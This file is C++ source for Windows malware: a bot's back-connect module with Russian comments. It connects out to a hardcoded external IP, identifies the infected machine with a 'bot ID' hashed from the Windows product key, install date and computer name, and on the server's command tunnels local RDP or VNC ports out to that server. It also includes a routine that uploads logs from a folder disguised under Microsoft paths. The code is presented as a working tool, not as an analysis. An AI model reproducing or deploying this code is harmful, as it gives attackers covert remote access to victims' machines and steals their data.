#include <winsock2.h>
#include <windows.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <limits.h>

#pragma comment(linker, "/ENTRY:main" )

const int ID_FILE_ADD = 2;
const int ID_FILE_NEW = 3;
const int ID_SIZE_FILE = 4;
const int ID_VNC_CONNECT = 6;
const int ID_PORT_FORWARD = 7;
const int ID_PING = 9;

//const char* IP_PORTFORW = "192.168.0.100";
//const char* IP_PORTFORW = "10.4.145.157";

const char* IP_PORTFORW = "188.72.202.163";
//const char* IP_PORTFORW = "184.82.179.240";
//const char* IP_PORTFORW = "88.198.11.131";

const int PORT_PORTFOW = 700;

struct TUNNEL_INFO
{
	SOCKET s1, s2;
};

#pragma pack(1)
struct Packet
{
	char id;
	int size;
};
#pragma pop()

struct FileInfo
{
	char name[MAX_PATH];
	int size;
	FILETIME time; //время последней записи в файл
	FileInfo* next;
};

FileInfo* listFileInfo = 0;
SOCKET curr_sc;

char* u_alloc(int sz)
{
	return (char*)LocalAlloc( LPTR, sz );
}

void u_free(void* mem)
{
	LocalFree(mem);
}

int ReadSocket( int sc, void* data, int c_data, int wait = INT_MAX );
int ReadPacket( int& id, int sc, void** data, int wait = INT_MAX );
void SendLogs();
void ClearListFileInfo();

HANDLE u_CreateFile(const char* nameFile, bool read = false, bool add = false)
{
	HANDLE fout = CreateFileA( nameFile, (read ? GENERIC_READ : GENERIC_WRITE), FILE_SHARE_READ | FILE_SHARE_WRITE, 0, (read || add ? OPEN_EXISTING : CREATE_ALWAYS), 0, 0 );
    if( fout == INVALID_HANDLE_VALUE ) return 0;
	if( add ) SetFilePointer( fout, 0, 0, FILE_END );
	return fout;
}

int u_ReadFile(HANDLE file, void* data, int c_data)
{
	DWORD rl = 0;
	ReadFile( file, data, c_data, &rl, 0 );
	return rl;
}

void u_memcpy( char* dst, char* src, int c )
{
	if( c > 0 )
		while( c-- ) *dst++ = *src++;
}

void u_memset( void* dst, char c, int count )
{
	char* p = (char*)dst;
	while( count-- )
		*p++ = c;
}

//void DbgMsg(const char *format, ...)
//{
//}

void DbgMsg(const char *format, ...)
{
	char buf[512];
	va_list mylist;

	va_start(mylist, format);
	wvsprintfA(buf, format, mylist);
	va_end(mylist);

	OutputDebugStringA(buf);
}


SOCKET ConnectWithIP(const char* ip, int port)
{
	SOCKET s = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	if( s != INVALID_SOCKET )
	{
		sockaddr_in laddr;
		ZeroMemory( &laddr, sizeof(laddr) );
		laddr.sin_family = AF_INET;
		if( bind( s, (sockaddr*)&laddr, sizeof(laddr) ) == 0 )
		{
			sockaddr_in raddr;
			ZeroMemory( &raddr, sizeof(raddr) );
			raddr.sin_family = AF_INET;
			raddr.sin_port = htons(port);
			raddr.sin_addr.S_un.S_addr = inet_addr(ip);
			if( connect( s, (sockaddr*)&raddr, sizeof(raddr) ) == 0 )
			{
				return s;
			}
		}
	}
	return 0;
}

bool WriteSocket( int sc, void* data, int c_data )
{
	if( send( sc, (char*)data, c_data, 0 ) == SOCKET_ERROR )
		return false;
	return true;
}


int ReadSocket( int sc, void* data, int c_data, int wait )
{
	static char buffer[8192];
	static int readedBuf = 0;
	int ret = 0;
	if( sc == 0 ) //очистка буфера
	{
		readedBuf = 0;
	}
	else
	{
		for(;;)
		{
			if( readedBuf >= c_data )
			{
				u_memcpy( (char*)data, buffer, c_data );
				u_memcpy( buffer, buffer + c_data, readedBuf - c_data );
				readedBuf -= c_data;
				ret = c_data;
				break;
			}
            fd_set fdsr;
            fdsr.fd_count = 1;
            fdsr.fd_array[0] = sc;
            timeval waitEvent;
            waitEvent.tv_sec = wait;
            waitEvent.tv_usec = 0;

            int events = select(0,&fdsr,NULL,NULL, &waitEvent);

            if( events == 0 ) return -1; //ничего не пришло, нужно ждать
            if( events == SOCKET_ERROR ) break;
			int c = recv( sc, buffer + readedBuf, sizeof(buffer) - readedBuf, 0 );
			if( c == SOCKET_ERROR || c == 0 )
				break;
			readedBuf += c;
		}
	}
	return ret;
}

bool WritePacket( int id, int sc, void* data, int c_data )
{
	//DbgMsg( "write packet id %d, size %d", id, c_data );
	bool ret = true;
	Packet p;;
	p.id = id;
	do
	{
		int sz = c_data <= 4096 ? c_data : 4096;
		p.size = sz;
		if( !WriteSocket( sc, &p, sizeof(p) ) )
		{
			ret = false;
			break;
		}
		if( !WriteSocket( sc, data, sz ) )
		{
			ret = false;
			break;
		}
		c_data -= sz;
		data = (char*)data + sz;
	} while( c_data > 0 );
	return ret;
}

int ReadPacket( int& id, int sc, void** data, int wait )
{
	Packet p;
	int res = ReadSocket( sc, &p, sizeof(p), wait );
	if( res < 0 )
        return -1;
	if( res == 0 || p.id == 0 || p.size <= 0 )
		return 0;
	*data = u_alloc(p.size);
	res = ReadSocket( sc, *data, p.size );
	if( res == 0 )
		return 0;
	id = p.id;
	//DbgMsg( "read packet id %d, size %d", id, p.size );
    return p.size;
}

void WINAPI Tunnel(TUNNEL_INFO *tunnelInfo)
{
    DbgMsg("start tunnel");
    while (true)
    {
        fd_set fdsr;
        fdsr.fd_count=2;
        fdsr.fd_array[0]=tunnelInfo->s1;
        fdsr.fd_array[1]=tunnelInfo->s2;

        if (select(0,&fdsr,NULL,NULL,NULL) < 1)
		{
            break;
		}

        for (u_int i=0; i < fdsr.fd_count; i++)
        {
            char buf[1024];
            int dw;
            SOCKET hRead=fdsr.fd_array[i],
                   hWrite=((hRead == tunnelInfo->s1) ? tunnelInfo->s2 : tunnelInfo->s1);
            if (((dw=recv(hRead,buf,sizeof(buf), 0)) < 1) || (send(hWrite,buf,dw, 0) != dw))
                goto end;
           DbgMsg("transfer %d bytes", dw);
        }
    }
end:
    DbgMsg("stop tunnel");
	closesocket(tunnelInfo->s1);
    closesocket(tunnelInfo->s2);
    u_free(tunnelInfo);
    return;
}

LPSTR MakeMachineID();

static DWORD WINAPI MainPortForward(void* param)
{
    int portVNC = (int)param;
    char* idBot = MakeMachineID();
    int c_idBot = lstrlenA(idBot);
    while(true)
    {
		DbgMsg("Connect server %s:%d", IP_PORTFORW, PORT_PORTFOW );
        SOCKET sc = ConnectWithIP( IP_PORTFORW, PORT_PORTFOW ); //соединяемся с сервером
        if( sc )
        {
            curr_sc = sc;
            DbgMsg("Connect vnc");
            if( WritePacket( ID_VNC_CONNECT, sc, idBot, c_idBot ) ) //передаем серверу ид бота
            {
                DbgMsg(idBot);
                int on_ping = 3; //сообщаем серверу что бот рабочий каждые 6 с
                while(true)
                {
                    void* data;
                    int id;
                    //DbgMsg("wait packet");
                    int sz = ReadPacket( id, sc, &data, 2 ); //ждем команду от сервера
                    if( sz == 0 )
                        break;
                    if( sz > 0 )
                    {
                        switch(id)
                        {
                            case ID_PORT_FORWARD: //соединяемся с сервером для проброса порта
                                if( sz == 6 )
                                {
                                    portVNC = *((short*)((char*)data + 4));
                                    DbgMsg( "connect port %d", portVNC );
                                    SOCKET sc1 = ConnectWithIP( "127.0.0.1", portVNC ); //соединяемся с VNC
                                    if( sc1 )
									{
										DbgMsg("Connect with server");
                                        SOCKET sc2 = ConnectWithIP( IP_PORTFORW, PORT_PORTFOW );
                                        if( sc2 != 0 && WritePacket( ID_PORT_FORWARD, sc2, data, sz ) ) //говорим серверу что нужно начать проброс порта
                                        {
											DbgMsg("Run tunnel");
                                            //запускаем туннель
                                            TUNNEL_INFO* tunnel = (TUNNEL_INFO*)u_alloc(sizeof(TUNNEL_INFO));
                                            tunnel->s1 = sc1;
                                            tunnel->s2 = sc2;
                                            CloseHandle(CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)Tunnel,(LPVOID)tunnel,0,NULL));
                                        }
                                        else
                                        {
                                            closesocket(sc1);
                                            closesocket(sc2);
                                        }
                                    }
                                }
                                break;
                        }
                        u_free(data);
                    }
                    //SendLogs();
                    if( on_ping-- == 0 )
                    {
                        if( !WritePacket( ID_PING, sc, &sz, 1 ) ) //неважно что отправлять, важно сказать что живы
                            break;
                        on_ping = 3; //через 6 секунд снова будем здесь
                    }
                }
                //OutputDebugStringA("disconnect");
            }
            closesocket(sc);
            ClearListFileInfo();
        }
        else
            Sleep(5000);
        //OutputDebugStringA("wait connect");
    }
}

FileInfo* FindFileInfo( const char* nameFile )
{
	FileInfo* curr = listFileInfo;
	if( curr )
		do
		{
			if( lstrcmpA( nameFile, curr->name ) == 0 )
				return curr;
			curr = curr->next;
		} while( curr != listFileInfo );
	return 0;
}

FileInfo* FindAddFileInfo( int type, const char* nameFile )
{
	FileInfo* finded = FindFileInfo(nameFile);
	if( finded == 0 )
	{
		finded = (FileInfo*)u_alloc(sizeof(FileInfo));
		lstrcpyA( finded->name, nameFile );
		HANDLE file = u_CreateFile( nameFile, true );
		if( file != 0 )
		{
			finded->next = 0;
			GetFileTime( file, 0, 0, &finded->time );
			char* nf = PathFindFileNameA(nameFile); //только имя файла
			//узнаем размер этого файла на сервере
			char buf[128];
			buf[0] = type;
			lstrcpyA( buf + 1, nf );
			WritePacket( ID_SIZE_FILE, curr_sc, buf, lstrlenA(nf) + 1 );
			int id;
			void *size;
			int res = ReadPacket( id, curr_sc, &size );
			if( id == ID_SIZE_FILE )
			{
				finded->size = *((int*)size);
				u_free(size);
				//добавляем в список
				if( listFileInfo )
				{
					finded->next = listFileInfo->next;
					listFileInfo->next = finded;
				}
				else
					finded->next = finded;
				listFileInfo = finded;
			}
		}
	}
	return finded;
}

void ClearListFileInfo()
{
	if( listFileInfo )
	{
		FileInfo* curr = listFileInfo->next;
		listFileInfo->next = 0;
		while( curr )
		{
			FileInfo* next = curr->next;
			u_free(curr);
			curr = next;
		}
		listFileInfo = 0;
	}
}

void SendFileIfAdd(int type, const char* pathFile, const char* nameFile)
{
	DbgMsg( "send file: %s", pathFile );
	FileInfo* fi = FindAddFileInfo( type, pathFile );
	if( fi )
	{
		HANDLE f = u_CreateFile( pathFile, true );
		if( f )
		{
			int size = GetFileSize( f, 0 );
			if( size > fi->size )
			{
				SetFilePointer( f, fi->size, 0, FILE_BEGIN );
				int c_data = size - fi->size;
				if ( c_data > 4096 - 256 ) c_data = 4096 - 256; //из-за ограничения по размеру пакета
				int lenName = lstrlenA(nameFile);
				int sz = 2 + lenName + c_data;
				char* data = (char*)u_alloc(sz);
				data[0] = type;
				data[1] = lenName;
				lstrcpyA( data + 2, nameFile );
				c_data = u_ReadFile( f, data + 2 + lenName , c_data );
				WritePacket( ID_FILE_ADD, curr_sc, data, 2 + lenName + c_data );
				u_free(data);
				fi->size += c_data;
				DbgMsg( "send for %s %d bytes", nameFile, c_data );
			}
			CloseHandle(f);
		}
	}
}

//%appdata%\microsoft\windows\wsus\drwatson
void SendLogs()
{
	char path[MAX_PATH], folder[MAX_PATH];
	SHGetFolderPathA( 0, CSIDL_APPDATA, 0, 0, path );
	PathAppendA( path, "microsoft\\windows\\wsus\\drwatson" );
	lstrcpyA( folder, path );
	PathAppendA( path, "*.*" );
	WIN32_FIND_DATAA fd;
	DbgMsg(path);
	HANDLE finder = FindFirstFileA( path, &fd ); //запускаем поиск
	if( finder != INVALID_HANDLE_VALUE )
	{
		do
		{
		    if( (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0 )
		    {
                PathAppendA( folder, fd.cFileName );
                DbgMsg("%s;%s", folder, fd.cFileName);
                SendFileIfAdd( 3, folder, fd.cFileName);
                PathRemoveFileSpecA(folder);
		    }
		} while( FindNextFileA( finder, &fd ) );
	}
	FindClose(finder);
}

void RunPortForward(int port)
{
    DbgMsg("RunPortForward");
    HANDLE hThread = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&MainPortForward, (LPVOID)port, 0, NULL );
    CloseHandle(hThread);
}

int main()
{
	WSADATA wsa; 
	WSAStartup( MAKEWORD(2,0), &wsa );
	int port = 3389;
	MainPortForward((LPVOID)port);
	WSACleanup();
}

// some kind of global vars
char szMachineID[17] = "";
char szRegPath1[] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\0";
char szDigitalProductId[] = "DigitalProductId\0";
char szInstallDate[] = "InstallDate\0";

char szRegId[] = "RegId\0";

DWORD dwMakeMachineID_done = 0;

int myHashData(DWORD lpData, DWORD dwDataSize)
{
	DWORD dwResult = 0;
	_asm {


		pushad

		mov edi, lpData
		mov ebx, 0 //hash
		mov ecx, 0 //cr
		mov eax, dwDataSize

		//.IF (eax>0)
		cmp eax, 0
		jle ERR_BAD_LEN

		//.REPEAT
REPEAT_LABEL:

		 xor cl, BYTE ptr [edi]  // cr
		 xor bl, BYTE ptr [edi]  // cl

	 		// normalize cr to 32bit shift
	 		//.WHILE cl>=32
WHILE_LABEL:
	 			sub cl, 32
	 		//.endw
			cmp cl, 32
			jge WHILE_LABEL

		 rol ebx, cl

		 inc edi
		 mov dl, BYTE ptr [edi] // cr
		 dec eax
		//.UNTIL (eax==0)
		cmp eax, 0
		jne REPEAT_LABEL

//		.ENDIF
ERR_BAD_LEN:
		mov dwResult, ebx

		popad

		mov eax, dwResult

	}
}

// main magic is done here
LPSTR MakeMachineID()
{
	DWORD iBufferSize = 0;
	int flShouldMakeUniqID = 0;
	DWORD dwExtraHashForMachineID = 0;

	// really run only once
	if (!dwMakeMachineID_done) {

		// try to open some reg key
		HKEY hKey = 0;
		if ( RegOpenKeyExA(HKEY_LOCAL_MACHINE, (LPCSTR)szRegPath1, 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS ) {
				//printf("regkey opened\n");

			// prepare pCryptKeyBuff
			PVOID pCryptKeyBuff;
			pCryptKeyBuff = GlobalAlloc(GPTR, 10240);
			// init buffer with not-null pre-defined data to avoid clear data in registry in case of absent DigitalProductId in registry
			u_memset(pCryptKeyBuff, 0x30, 100);

			// try to query DigitalProductId
			iBufferSize = 10240;
			if ( RegQueryValueExA(hKey, (LPCSTR)szDigitalProductId, NULL, NULL, (LPBYTE) pCryptKeyBuff, &iBufferSize) != ERROR_SUCCESS ) {
				flShouldMakeUniqID+=1; //printf("regkey2 ERR\n");
			}
			//printf("step1 crypt buff=[%s] prod_id=[%s] size=%u\n", pCryptKeyBuff, (DWORD)pCryptKeyBuff + 8, iBufferSize);

			// make dwExtraHashForMachineID value
			iBufferSize = 4;
			if ( RegQueryValueExA(hKey, (LPCSTR)szInstallDate, NULL, NULL, (LPBYTE) &dwExtraHashForMachineID, &iBufferSize) != ERROR_SUCCESS ) {
				flShouldMakeUniqID+=1; //printf("regkey3 ERR\n");
			}
			//printf("step2 e_hash=%04Xh size=%u\n", dwExtraHashForMachineID, iBufferSize);

			// check if we should create / use some uniq id
			if (flShouldMakeUniqID > 0) {
				// first try to read existing extra value into dwGeneratedMachineIDExtraValue
				DWORD dwGeneratedMachineIDExtraValue = 0;
				iBufferSize = 4;
				if ( RegQueryValueExA(hKey, (LPCSTR)szRegId, NULL, NULL, (LPBYTE) &dwGeneratedMachineIDExtraValue, &iBufferSize) != ERROR_SUCCESS ) {

					// failed to read extra value, get it from ticks
					// NB: we should use it ONLY if id saved successfully - otherwise to protect self from constant change of
					//     machine ids, leave dwGeneratedMachineIDExtraValue 0
					dwGeneratedMachineIDExtraValue = GetTickCount();

					// now try to save it in registry - close read-only handle
					RegCloseKey(hKey);

					// try to open in write mode
					if ( RegOpenKeyExA(HKEY_LOCAL_MACHINE, (LPCSTR)szRegPath1, 0, KEY_READ + KEY_WRITE, &hKey) == ERROR_SUCCESS ) {

						// try write key, with error-checking
						if ( RegSetValueExA(hKey, (LPCSTR)szRegId, NULL, REG_DWORD, (LPBYTE) &dwGeneratedMachineIDExtraValue, 4) != ERROR_SUCCESS ) {
							 dwGeneratedMachineIDExtraValue=0;
						}

					} else { dwGeneratedMachineIDExtraValue=0; }


				}

				// use extra value in any case
				dwExtraHashForMachineID = dwExtraHashForMachineID ^ dwGeneratedMachineIDExtraValue;

			}

			// close reg key
			RegCloseKey( hKey );

			// shift pCryptKeyBuff pointer by 8 bytes
			//pCryptKeyBuff = (PVOID)( (DWORD)pCryptKeyBuff + 8 );

			// *** now this is MakeMachineID_step2 contents ***

			// make hash from WinID (16+1 bytes from pCryptKeyBuff) [HASH PART 1]
			LPVOID pWinId = (PVOID)((DWORD)pCryptKeyBuff + 8);
			DWORD dwHash1 = myHashData( (DWORD)pWinId, lstrlenA((LPCSTR)pWinId) ) ^ dwExtraHashForMachineID;

			//printf("hash p1 = %04Xh dwExtraHashForMachineID = %04Xh\n", dwHash1, dwExtraHashForMachineID);

			// and part2 using Computer name
			iBufferSize = MAX_COMPUTERNAME_LENGTH+1;
			PVOID pCompName = GlobalAlloc( GPTR,  iBufferSize);
			GetComputerNameA( (LPSTR)pCompName, &iBufferSize);
			DWORD dwHash2 = myHashData( (DWORD)pCompName, lstrlenA((LPSTR)pCompName));
			GlobalFree(pCompName);

			//printf("hash p2 = %04Xh\n", dwHash2);

			// free pCryptKeyBuff
			GlobalFree(pCryptKeyBuff);

			// combine dwHash1 + dwHash2 into szMachineID
			char szMID_format[] = "%08X%08X";
			wsprintfA(szMachineID, szMID_format, dwHash1, dwHash2);

			//printf(szMachineID);


		}


	}
	// return pointer to global var filled with textual machine-id representation
	return szMachineID;
}
